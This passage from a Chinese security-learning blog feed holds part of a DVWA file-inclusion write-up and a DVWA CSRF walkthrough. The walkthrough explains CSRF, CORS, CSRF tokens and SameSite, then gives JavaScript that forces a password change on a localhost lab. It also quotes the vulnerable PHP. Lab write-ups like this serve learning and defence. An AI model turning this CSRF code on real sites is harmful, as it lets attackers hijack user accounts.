&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file1.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file2.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file3.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// This isn&amp;#39;t the page we want!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>硬编码了所有可能的文件，如此一来就没有利用空间了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>文件包含这题感觉有点emmm&lt;/p>
&lt;p>怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。&lt;/p>
&lt;p>因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。&lt;/p>
&lt;p>烦心。&lt;/p></description></item><item><title>DVWA上手记录-CSRF</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</link><pubDate>Mon, 25 Apr 2022 16:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这次看下 DVWA 的 CSRF 题。&lt;/p>
&lt;p>昨天忙完了工作，闲下来的时间顺便看了下 DVWA 的部署。在我的 fork 分支里添加了 docker 支持。因为是纯新增，不太可能有 breaking change，直接在 GitHub 网页点点鼠标就能同步上游代码。这样就能用上最新的 DVWA 同时享受 docker 一键启动 DVWA 环境的快乐了。&lt;/p>
&lt;p>用法很简单：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git clone https://github.com/nnnewb/dvwa
&lt;span class="nb">cd&lt;/span> dvwa
docker-compose up -d --build
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>就这样！&lt;/p>
&lt;p>当然还有可能遇到一些网络问题，什么&lt;code>deb.debian.org&lt;/code>访问慢或者&lt;code>timeout&lt;/code>、&lt;code>connection reset&lt;/code>之类的，但我觉得想玩这个的多少得有点自己动手解决问题的能力吧，不能跟三岁小孩一样等别人喂嘴里。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="利用方式">利用方式&lt;/h3>
&lt;p>CSRF 全名是跨站请求伪造 &lt;em>Cross Site Request Forgery&lt;/em> 。&lt;/p>
&lt;p>简单地说，服务器相信收到的请求是用户控制浏览器发起的，是出于用户自身的意图做某些操作。但实际上，是另一个恶意网站的 js 脚本控制了用户的浏览器，在用户不知情的情况下，冒充用户的身份请求服务器做一些并非出自用户本意的操作。&lt;/p>
&lt;p>CSRF 利用中有三个组成部分：&lt;/p>
&lt;ul>
&lt;li>用户浏览器&lt;/li>
&lt;li>目标服务器&lt;/li>
&lt;li>恶意网站&lt;/li>
&lt;/ul>
&lt;p>用户不访问恶意网站，CSRF 攻击就无从谈起。&lt;/p>
&lt;h3 id="和cors的关系">和CORS的关系&lt;/h3>
&lt;p>说没关系其实也有。CORS全称是 &lt;em>Cross Origin Resource Sharing&lt;/em>，跨域资源共享，也是防浏览器被恶意网站控制着，背着用户拿自己的数据。但有所不同的是，CORS 其实是相当宽松的，因为 CORS 只要求浏览器对 “复杂请求” 发送预检，但简单请求（注意哦，包括 POST 请求，但只能包含指定的 Header 和限定的 &lt;code>Content-Type&lt;/code>）会直接呈交给服务器。&lt;/p>
&lt;p>而且这个请求是可以带 Cookies 的，也就是说只要接口满足条件（接受限定的 &lt;code>Content-Type&lt;/code>，对 Header 没有要求），CORS 策略就没法阻止 CSRF 攻击。&lt;/p>
&lt;p>举一个更实际的例子，哪怕恶意网站只是写了一个简单的表单：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">form&lt;/span> &lt;span class="na">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;POST&amp;#34;&lt;/span> &lt;span class="na">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://good.com/some/action&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">/&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;submit&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>submit&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>也满足 CORS 对于 &lt;em>简单请求&lt;/em> 的定义，浏览器不会阻止或预检。&lt;/p>
&lt;p>因此，即使配置良好的 CORS，也无法杜绝 CSRF 攻击。但 CORS 确实是防御 CSRF 攻击的重要环节。&lt;/p>
&lt;h3 id="防御">防御&lt;/h3>
&lt;p>防御CSRF攻击说难不难，因为&lt;a class="link" href="https://portswigger.net/web-security/CSRF" target="_blank" rel="noopener"
>发起 CSRF 攻击有几个重要前提&lt;/a>：&lt;/p>
&lt;ul>
&lt;li>基于 Cookies 的会话控制&lt;/li>
&lt;li>没有不可预测的请求参数&lt;/li>
&lt;/ul>
&lt;p>基于上面两点：&lt;/p>
&lt;p>如果会话控制存在于自定义的 HTTP 头或 Cookies 之外的 HTTP 头（比如&lt;code>Authorization&lt;/code>），那么 CORS 就会要求先发出一个预检请求，只有在服务器返回 &lt;code>Access-Control-Allow-Origin&lt;/code> 包含当前域名的时候才会正式发出请求。这样一来除非先 bypass CORS ，不然就无法发起 CSRF 攻击。&lt;/p>
&lt;p>另一种就是增加一个攻击者不可预测的参数，也就是常说的 CSRF Token。&lt;/p>
&lt;p>CSRF Token 是一个和会话绑定的随机（至少对攻击者来说不可预知的）字符串（或别的数据类型）。CSRF 的作用原理依然是要依靠 CORS，恶意网站如果要伪造请求提交一个表单，那就必须拿到 CSRF Token，想获取 CSRF Token 就必须拿到表单所在的页面，而请求表单页面就必须满足 CORS 策略——即使是简单请求，没有预检，浏览器在收到响应后也会根据 &lt;code>Access-Control-Allow-Origin&lt;/code> 的设定拒绝给 XHR 返回数据。网页拿不到 CSRF Token，自然也就没办法伪造出请求。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>好的，就是踩点。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872.png"
width="694"
height="384"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872_hu9f65ffe27ceedc88d5a5d4b939cdbb89_29651_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872_hu9f65ffe27ceedc88d5a5d4b939cdbb89_29651_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113359872"
class="gallery-image"
data-flex-grow="180"
data-flex-basis="433px"
>&lt;/p>
&lt;p>一个修改密码的页面，只有登陆用户能修改自己的密码（因为不登陆根本看不到这个页面）。另外还提供了一个测试登陆的地方，就是那个 &lt;em>Test Credentials&lt;/em> 按钮。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432.png"
width="602"
height="462"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432_hu6562a17a4cfa6d40103e315209b7dae1_19442_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432_hu6562a17a4cfa6d40103e315209b7dae1_19442_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113529432"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="312px"
>&lt;/p>
&lt;p>在测试登陆这里输入自己的用户名密码（默认是 &lt;code>admin&lt;/code>,&lt;code>password&lt;/code>）会提示&lt;code>valid password for 'admin'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471.png"
width="602"
height="462"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471_hu7a377251ca067ccef2deefe4b718b765_20140_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471_hu7a377251ca067ccef2deefe4b718b765_20140_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113619471"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="312px"
>&lt;/p>
&lt;p>修改密码的地方我们也试一试。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665.png"
width="681"
height="359"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665_hu83b45cf6d41374fdab532da43f4da5fb_27229_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665_hu83b45cf6d41374fdab532da43f4da5fb_27229_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113707665"
class="gallery-image"
data-flex-grow="189"
data-flex-basis="455px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949.png"
width="691"
height="361"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949_hub982db786f97e05051e2c58967ba7a51_22558_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949_hub982db786f97e05051e2c58967ba7a51_22558_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113713949"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="459px"
>&lt;/p>
&lt;p>修改后提示 &lt;code>Password changed&lt;/code>，观察下 F12 调试器里的请求和响应头。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395.png"
width="1008"
height="449"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395_hu218a45c37329024b7d96f4732fad50d1_41557_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395_hu218a45c37329024b7d96f4732fad50d1_41557_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425143614395"
class="gallery-image"
data-flex-grow="224"
data-flex-basis="538px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579.png"
width="450"
height="287"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579_hu33b023caf2ec6ec6032bf544565c0cbf_18590_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579_hu33b023caf2ec6ec6032bf544565c0cbf_18590_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425143623579"
class="gallery-image"
data-flex-grow="156"
data-flex-basis="376px"
>&lt;/p>
&lt;p>接着看一眼表单代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152.png"
width="520"
height="218"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152_hu5f2daf098704a2b708824ee309756675_18422_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152_hu5f2daf098704a2b708824ee309756675_18422_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113815152"
class="gallery-image"
data-flex-grow="238"
data-flex-basis="572px"
>&lt;/p>
&lt;p>只有我觉得&lt;code>form&lt;/code>里&lt;code>method=GET&lt;/code>是很怪的事情吗？感觉学会写 HTML 以来就没想过在 &lt;code>form&lt;/code> 里用 &lt;code>GET&lt;/code> 方法&amp;hellip;&lt;/p>
&lt;p>咳，回到正题。&lt;/p>
&lt;p>到这里踩点差不多就结束了，可以发现 Low 难度下表单没有 CSRF Token 保护，因此可以简单直接写一个 XHR 修改掉密码。&lt;/p>
&lt;h3 id="题解">题解&lt;/h3>
&lt;p>必须先提一个我实际下手写的时候才踩到的坑，浏览器发展速度实在太快了。&lt;/p>
&lt;p>在&lt;a class="link" href="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-05#section-5.3.7" target="_blank" rel="noopener"
>RFC6265bis&lt;/a>里引入了一个新的 Cookies 属性，&lt;code>SameSite&lt;/code>。&lt;a class="link" href="https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure?hl=zh-cn" target="_blank" rel="noopener"
>2019年5月份，谷歌宣布推出了一个默认安全的 Cookie 安全模型&lt;/a>，由新的 Cookie 分类系统（&lt;a class="link" href="https://tools.ietf.org/html/draft-west-cookie-incrementalism-00" target="_blank" rel="noopener"
>规范&lt;/a>）提供支持。在规范（PS：同样是谷歌提出的）中将 &lt;code>SameSite&lt;/code> 默认设置为 &lt;code>Lax&lt;/code>，只允许 Cookies 与顶级导航（包括第三方网站发起的GET请求）一起发送。&lt;/p>
&lt;p>这么说可能有点不好理解，我写了一个简单的 demo，在这项改动之前应该是带上 Cookies 直接发出的请求。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">var&lt;/span> &lt;span class="nx">xhr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">XMLHttpRequest&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/csrf/?password_new=admin&amp;amp;password_conf=admin&amp;amp;Change=Change&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">withCredentials&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但在这项改动之后（现在是2022年4月25日，Chrome内核版本 100，Edge 浏览器），虽然这是个简单请求，无需预检就会发送，但因为 Cookies 的 &lt;code>SameSite&lt;/code> 属性变更为默认 &lt;code>Lax&lt;/code> 的原因，即使设置了 &lt;code>withCredentials=true&lt;/code> 请求里也不会带上 Cookies。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251.png"
width="951"
height="115"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251_huaa8a43c2711e3dfb7b7a9ac3a293cc3a_19838_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251_huaa8a43c2711e3dfb7b7a9ac3a293cc3a_19838_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425150932251"
class="gallery-image"
data-flex-grow="826"
data-flex-basis="1984px"
>&lt;/p>
&lt;p>这就有点恼人，不过稍作变通，还是可以直接控制用户的浏览器发起修改密码的请求，只是没 xhr 那么悄无声息。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;http://localhost:8080/vulnerabilities/csrf/?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如此一来，就满足了 &lt;code>SameSite=Lax&lt;/code> 的由顶级导航启动的要求。&lt;/p>
&lt;p>这里额外再说一句就是，&lt;code>iframe&lt;/code> 似乎也不被视作顶级导航，因此&lt;code>&amp;lt;iframe src=&amp;quot;...&amp;quot; width=&amp;quot;1&amp;quot; height=&amp;quot;1&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>也行不通，不会带上 Cookies。&lt;/p>
&lt;p>简单看了下 MDN 对默认 &lt;code>Lax&lt;/code> 策略的支持情况，只有少数几个浏览器还没跟进了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505.png"
width="810"
height="701"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505_hu0375771f01931166adb29727ee7ccafb_54993_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505_hu0375771f01931166adb29727ee7ccafb_54993_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425160233505"
class="gallery-image"
data-flex-grow="115"
data-flex-basis="277px"
>&lt;/p>
&lt;h3 id="代码审计">代码审计&lt;/h3>
&lt;p>又是很短一段 php 代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Change&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_new&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$pass_conf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_conf&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Do the passwords match?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nv">$pass_conf&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// They do!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Update the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;UPDATE `users` SET password = &amp;#39;&lt;/span>&lt;span class="si">$pass_new&lt;/span>&lt;span class="s2">&amp;#39; WHERE user = &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">dvwaCurrentUser&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for the user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Issue with passwords matching
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>逻辑很清晰不啰嗦，注意到几个点：&lt;/p>
